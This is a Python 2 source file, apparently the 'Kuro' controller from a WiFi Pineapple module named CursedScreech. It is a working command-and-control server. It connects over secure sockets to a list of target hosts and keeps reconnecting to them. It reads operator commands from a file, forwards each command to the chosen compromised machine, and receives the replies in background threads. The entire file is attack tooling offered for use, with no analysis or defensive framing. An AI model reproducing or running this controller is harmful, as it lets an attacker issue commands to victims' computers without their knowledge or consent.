# Kuro looms up ahead, won't allow us to pass.
# Let us not travel further, lest we unleash her wrath.
# Her screech can be heard from atop her perch,
# commanding those fallen under her curse.

import select
import sys
import threading
from target import Target

# Pull settings from file
settingsFile = "/pineapple/modules/CursedScreech/includes/forest/settings"
target_list = ""
activity_log = ""
cmd_list = ""
settings = {}
with open(settingsFile, "r") as sFile:
	for line in sFile:
		params = line.strip("\n").split("=")
		if params[0] == "target_list":
			target_list = params[1]
		elif params[0] == "activity_log":
			activity_log = params[1]
		elif params[0] == "cmd_list":
			cmd_list = params[1]
		else:
			pass
			
def logActivity(msg):
	with open(activity_log, "a") as log:
		log.write(msg + "\n")
		
def connectTarget(ip, port):
	target = Target(ip, int(port))
	target.secureConnect()
	if target.isConnected():
		return target
	else:
		return False
		
# A list for target objects and threads on which to receive data
targets = []
threads = []
killThreads = False

def recvOnTarget(t):
	global killThreads
	while True:
		if killThreads == True:
			break
			
		try:
			ready = select.select([t.socket], [], [], 5)
			if ready[0]:
				t.recv()
		except:
			break

# Function to disconnect all targets and quit
def cleanUp(targets):
	# Close all sockets
	print "[>] Cleaning up sockets"
	logActivity("[>] Cleaning up sockets")

	# Attempt to kill the thread
	global killThreads
	killThreads = True

	for target in targets:
		target.disconnect()

# Attempt to connect to all targets and store them in the targets list
with open(target_list, "r") as targetFile:
	for t in targetFile:

		# Strip newline characters from the line
		t = t.strip("\n")

		try:
			ip = t.split(":")[0]
			port = t.split(":")[1]
		
			# Connect to the target and append the socket to our list
			newTarget = connectTarget(ip, port)
			if newTarget != False:
				newThread = threading.Thread(target=recvOnTarget, args=(newTarget,))
				threads.append(newThread)
				newThread.start()
				targets.append(newTarget)

		except KeyboardInterrupt:
			print "Interrupt detected.  Moving to next target..."
			continue;

quitFlag = False
if len(targets) > 0:
	try:
		logActivity("[!] Kuro is ready")
		while True:
			
			# Read from the target list to see if any new targets are
			# available.  If so, attempt to connect to them.
			with open(target_list, "r") as targetFile:
				for line in targetFile:
					skip = False
					line = line.strip("\n")
					ip = line.split(":")[0]
					port = line.split(":")[1]
					
					# If the address is found in the target list, check if
					# the port is the same
					if any(t.addr == ip for t in targets):
						for t in targets:
							# If the ip address matches but the port does not
							# disconnect the target and remove it from the list
							if t.addr == ip and t.port != int(port):
								t.disconnect()
								targets.remove(t)
								
								# Recreate the target object, connect to it, and
								# add it back to the list
								newTarget = connectTarget(ip, port)
								if newTarget != False:
									newThread = threading.Thread(target=recvOnTarget, args=(newTarget,))
									threads.append(newThread)
									newThread.start()
									targets.append(newTarget)
					else:
						newTarget = connectTarget(ip, port)
						if newTarget != False:
							newThread = threading.Thread(target=recvOnTarget, args=(newTarget,))
							threads.append(newThread)
							newThread.start()
							targets.append(newTarget)
			
			# Read from cmd.log, send to targets listed, and clear
			# the file for next use.
			with open(cmd_list, "r") as cmdFile:
				for line in cmdFile:
					params = line.strip("\n").rsplit(":", 1)
					cmd = params[0]
					addr = params[1]
					
					# Check if Kuro received a command to end her own process
					if cmd == "killyour" and addr == "self":
						quitFlag = True
					else:
						for t in targets:
							if t.addr == addr and t.isConnected:
								t.send(cmd)
								
			# Clear the file
			open(cmd_list, "w").close()
				
			# Check if it's time to quit
			if quitFlag:
				break
				
	except KeyboardInterrupt:
		pass

cleanUp(targets)